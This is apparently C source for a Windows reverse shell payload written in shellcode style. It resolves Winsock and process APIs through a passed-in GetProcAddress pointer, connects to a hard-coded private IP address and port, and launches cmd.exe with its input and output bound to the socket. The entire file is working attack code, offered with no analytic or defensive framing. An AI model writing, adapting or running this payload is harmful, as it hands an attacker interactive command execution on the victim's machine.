#include <winsock2.h>
#include <windows.h>

// LPCSTR = const char *

void code ( void* (__stdcall *pGetProcAddress)(HANDLE, const char *),HANDLE hKern)
{   
    char sLL [] = "LoadLibraryA";
    char sWS2 [] = "ws2_32.dll";
    char sWSAStartup [] = "WSAStartup";
    char sWSASocket [] = "WSASocketA";
    char sConnect [] = "connect";
    char sCreateProcess [] = "CreateProcessA";
    char sWait [] = "WaitForSingleObject";
    const char sCMD [] ="C:\\Windows\\System32\\cmd.exe";
    char sClosesocket [] = "closesocket";
    char sWSACleanup [] = "WSACleanup";
    char sMemset [] = "memset";
    char sMSVCRT [] = "msvcrt.dll";
    
    HANDLE (__stdcall *pLoadLibrary)(const char * lpFileName) = pGetProcAddress(hKern,sLL);

    HANDLE hWinSock = pLoadLibrary(sWS2);
    HANDLE hMSVCRT = pLoadLibrary (sMSVCRT);

    int (__stdcall *pWSAStartup)(WORD,LPWSADATA) = pGetProcAddress(hWinSock,sWSAStartup);

    SOCKET (__stdcall *pWSASocket)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD) = pGetProcAddress(hWinSock,sWSASocket);

   int (__stdcall *pConnect)(SOCKET,const struct sockaddr *name,int) = pGetProcAddress(hWinSock,sConnect);


   BOOL (__stdcall *pCreateProcess)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION) = pGetProcAddress(hKern,sCreateProcess);
	
   DWORD (__stdcall *pWaitForSingleObject)(HANDLE,DWORD) = pGetProcAddress(hKern,sWait);

   int (__stdcall *pClosesocket)(SOCKET) = pGetProcAddress(hWinSock,sClosesocket);

   int (__stdcall *pWSACleanup) (void) = pGetProcAddress (hWinSock,sWSACleanup);

   void * (__stdcall *pMemset)(void *,int, size_t) = pGetProcAddress (hMSVCRT,sMemset);
    
    WSADATA wsadata;
    pWSAStartup (202,&wsadata);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = 0xB315;
    server.sin_addr.s_addr = 0x0138A8C0;
    
    SOCKET soc = pWSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);

    pConnect(soc,(struct sockaddr *)&server,sizeof(server));
	
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
	
 	pMemset (&piProcInfo,0,sizeof(PROCESS_INFORMATION));
	pMemset (&siStartInfo,0,sizeof(STARTUPINFO));

   	siStartInfo.cb = sizeof(STARTUPINFO); 
   	siStartInfo.hStdError = (HANDLE)soc;
   	siStartInfo.hStdOutput = (HANDLE)soc;
   	siStartInfo.hStdInput = (HANDLE)soc;
   	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	
	pCreateProcess(
	sCMD,
	NULL,
	NULL,
	NULL,
	TRUE,
	DETACHED_PROCESS,
	NULL,
	NULL,
	&siStartInfo,
	&piProcInfo
	);
	
	pWaitForSingleObject(piProcInfo.hProcess,INFINITE);


	pClosesocket(soc);
	pWSACleanup();
}


